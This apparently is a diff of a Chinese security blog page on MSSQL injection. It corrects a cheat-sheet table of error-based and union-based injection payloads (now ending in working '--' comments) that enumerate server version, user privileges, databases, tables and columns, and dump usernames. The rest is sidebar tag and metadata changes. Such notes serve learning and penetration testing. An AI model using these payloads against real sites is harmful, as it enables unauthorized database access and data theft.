@@ -45,7 +45,7 @@
         content="2021-08-05">
       <meta 
         property="og:article:modified_time" 
-        content="2021-08-12">
+        content="2021-08-15">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -345,7 +345,7 @@
 </tr>
 <tr>
 <td align="left">向表中插入内容</td>
-<td align="left">insert into <a href="http://www.zerochen.top/article/MSSQL%E6%B3%A8%E5%85%A5/field1,field2">tablename</a> values(value1,value2)</td>
+<td align="left">insert into tablename values(value1,value2)</td>
 </tr>
 <tr>
 <td align="left">删除内容</td>
@@ -372,51 +372,51 @@
 </tr>
 <tr>
 <td align="left">显示数据库版本</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select @@version) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select @@version) --</code></td>
 </tr>
 <tr>
 <td align="left">显示当前数据库名字</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select db_name()) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select db_name()) --</code></td>
 </tr>
 <tr>
 <td align="left">显示当前数据库连接的用户</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select user_name()) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select user_name()) --</code></td>
 </tr>
 <tr>
 <td align="left">判断当前数据库连接用户的权限 <br>页面正常为sysadmin权限</td>
-<td align="left"><code>?id=1&#39; and 1=(select is_srvrolemember(&#39;sysadmin&#39;)) –</code> <br>权限有： <br>sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin <br>注： <br><code>and 1=(select is_member(&#39;db_owner&#39;)) –</code> <br>判断是否为db_owner权限，可通过备份方式向网站写文件</td>
+<td align="left"><code>?id=1&#39; and 1=(select is_srvrolemember(&#39;sysadmin&#39;)) --</code> <br>权限有： <br>sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin <br>注： <br><code>and 1=(select is_member(&#39;db_owner&#39;)) --</code> <br>判断是否为db_owner权限，可通过备份方式向网站写文件</td>
 </tr>
 <tr>
 <td align="left">获取数据库数量</td>
-<td align="left">当数据类型为int类型时，无法触发强制类型转换，因此需要结合convert和cast as <br><br><code>?id=1&#39; and 1&lt;char(126)%2b(select cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126) –</code>  <br><br>使用convert <br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126)) –</code> <br><br>或使用二分法 <br><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) –</code></td>
+<td align="left">当数据类型为int类型时，无法触发强制类型转换，因此需要结合convert和cast as <br><br><code>?id=1&#39; and 1&lt;char(126)%2b(select cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126) --</code>  <br><br>使用convert <br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126)) --</code> <br><br>或使用二分法 <br><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --</code></td>
 </tr>
 <tr>
 <td align="left">获取数据库名称</td>
-<td align="left"><code>1&#39; and 1&lt;(select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)) –</code> <br>第二个top 1中的1为查第几个表，意为取前几个，这里使用了逻辑嵌套法，下同</td>
+<td align="left"><code>1&#39; and 1&lt;(select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)) --</code> <br>第二个top 1中的1为查第几个表，意为取前几个，这里使用了逻辑嵌套法，下同</td>
 </tr>
 <tr>
 <td align="left">判断数据库的表数量</td>
-<td align="left"><code>?id=1&#39; and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables)%2bchar(126) –</code>  <br><br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables)%2bchar(126)) –</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables)%2bchar(126) --</code>  <br><br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --</code></td>
 </tr>
 <tr>
 <td align="left">获取表名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)) --</code></td>
 </tr>
 <tr>
 <td align="left">获取表的字段数量</td>
-<td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126) –</code>  <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)) –</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name = &#39;tbname&#39;) –</code></td>
+<td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)--</code>  <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name = &#39;tbname&#39;) --</code></td>
 </tr>
 <tr>
 <td align="left">获取字段名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)) --</code></td>
 </tr>
 <tr>
 <td align="left">获取字段的数据数量</td>
-<td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126) – </code> <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126)) –</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(username) from tbname..users) –</code></td>
+<td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126) -- </code> <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(username) from tbname..users) --</code></td>
 </tr>
 <tr>
 <td align="left">获取字段数据</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)) --</code></td>
 </tr>
 </tbody></table>
 <h1 id="三、union联合查询"><a href="#三、union联合查询" class="headerlink" title="三、union联合查询"></a>三、union联合查询</h1><table>
@@ -427,12 +427,12 @@
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">判断列数``</td>
-<td align="left"><code>?id=1&#39; order by 3 –</code> <br>注： mssql union select 要求前后数据类型保持一致<br>1、变参数为不存在 <br>2、用null代替空字符</td>
+<td align="left">判断列数</td>
+<td align="left"><code>?id=1&#39; order by 3 --</code> <br>注： mssql union select 要求前后数据类型保持一致<br>1、变参数为不存在 <br>2、用null代替空字符</td>
 </tr>
 <tr>
 <td align="left">判断显示位</td>
-<td align="left"><code>?id=-1&#39; union select 1,2,3 –</code> <br><code>?id=1&#39; union select null,null,null –</code> （判断时不要用，无显示）</td>
+<td align="left"><code>?id=-1&#39; union select 1,2,3 --</code> <br><code>?id=1&#39; union select null,null,null --</code> （判断时不要用此句，无显示）</td>
 </tr>
 <tr>
 <td align="left">获取数据库版本</td>
@@ -866,17 +866,17 @@
         </div>
       </a>
     
-      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
-        <div class="categories-list-item">
-          环境搭建
-          <span class="categories-list-item-badge">7</span>
-        </div>
-      </a>
-    
       <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
         <div class="categories-list-item">
           漏洞复现
           <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">7</span>
         </div>
       </a>
     
@@ -923,99 +923,99 @@
   <div class="tags-list">
     
       <a 
+        href="/tags/Access/" 
+        title="Access">
+        <div class="tags-list-item">Access</div>
+      </a>
+    
+      <a 
+        href="/tags/BurpSuite%E4%BB%A3%E7%90%86/" 
+        title="BurpSuite代理">
+        <div class="tags-list-item">BurpSuite代理</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/" 
+        title="绕过Token爆破">
+        <div class="tags-list-item">绕过Token爆破</div>
+      </a>
+    
+      <a 
+        href="/tags/CSRF/" 
+        title="CSRF">
+        <div class="tags-list-item">CSRF</div>
+      </a>
+    
+      <a 
+        href="/tags/HTML/" 
+        title="HTML">
+        <div class="tags-list-item">HTML</div>
+      </a>
+    
+      <a 
+        href="/tags/CSS/" 
+        title="CSS">
+        <div class="tags-list-item">CSS</div>
+      </a>
+    
+      <a 
+        href="/tags/HTTP/" 
+        title="HTTP">
+        <div class="tags-list-item">HTTP</div>
+      </a>
+    
+      <a 
+        href="/tags/JavaScript/" 
+        title="JavaScript">
+        <div class="tags-list-item">JavaScript</div>
+      </a>
+    
+      <a 
+        href="/tags/JBoss/" 
+        title="JBoss">
+        <div class="tags-list-item">JBoss</div>
+      </a>
+    
+      <a 
+        href="/tags/Java/" 
+        title="Java">
+        <div class="tags-list-item">Java</div>
+      </a>
+    
+      <a 
+        href="/tags/MS17-010/" 
+        title="MS17-010">
+        <div class="tags-list-item">MS17-010</div>
+      </a>
+    
+      <a 
         href="/tags/%E9%9A%8F%E8%AE%B0/" 
         title="随记">
         <div class="tags-list-item">随记</div>
       </a>
     
       <a 
-        href="/tags/Redis/" 
-        title="Redis">
-        <div class="tags-list-item">Redis</div>
+        href="/tags/MSSQL/" 
+        title="MSSQL">
+        <div class="tags-list-item">MSSQL</div>
       </a>
     
       <a 
-        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
-        title="逻辑漏洞">
-        <div class="tags-list-item">逻辑漏洞</div>
+        href="/tags/Nosql/" 
+        title="Nosql">
+        <div class="tags-list-item">Nosql</div>
       </a>
     
       <a 
-        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
-        title="网络协议">
-        <div class="tags-list-item">网络协议</div>
+        href="/tags/mysql/" 
+        title="mysql">
+        <div class="tags-list-item">mysql</div>
       </a>
     
       <a 
-        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
-        title="文件上传">
-        <div class="tags-list-item">文件上传</div>
-      </a>
-    
-      <a 
-        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
-        title="文件包含">
-        <div class="tags-list-item">文件包含</div>
-      </a>
-    
-      <a 
-        href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
-        title="综合靶场">
-        <div class="tags-list-item">综合靶场</div>
-      </a>
-    
-      <a 
-        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
-        title="直播推流">
-        <div class="tags-list-item">直播推流</div>
-      </a>
-    
-      <a 
-        href="/tags/Nginx/" 
-        title="Nginx">
-        <div class="tags-list-item">Nginx</div>
-      </a>
-    
-      <a 
-        href="/tags/Apache/" 
-        title="Apache">
-        <div class="tags-list-item">Apache</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%8D%9A%E5%AE%A2/" 
-        title="博客">
-        <div class="tags-list-item">博客</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
-        title="命令执行">
-        <div class="tags-list-item">命令执行</div>
-      </a>
-    
-      <a 
-        href="/tags/%E6%8F%90%E6%9D%83/" 
-        title="提权">
-        <div class="tags-list-item">提权</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
-        title="反弹shell">
-        <div class="tags-list-item">反弹shell</div>
-      </a>
-    
-      <a 
-        href="/tags/SSRF/" 
-        title="SSRF">
-        <div class="tags-list-item">SSRF</div>
-      </a>
-    
-      <a 
-        href="/tags/XXE/" 
-        title="XXE">
-        <div class="tags-list-item">XXE</div>
+        href="/tags/Oracle/" 
+        title="Oracle">
+        <div class="tags-list-item">Oracle</div>
       </a>
     
   </div>
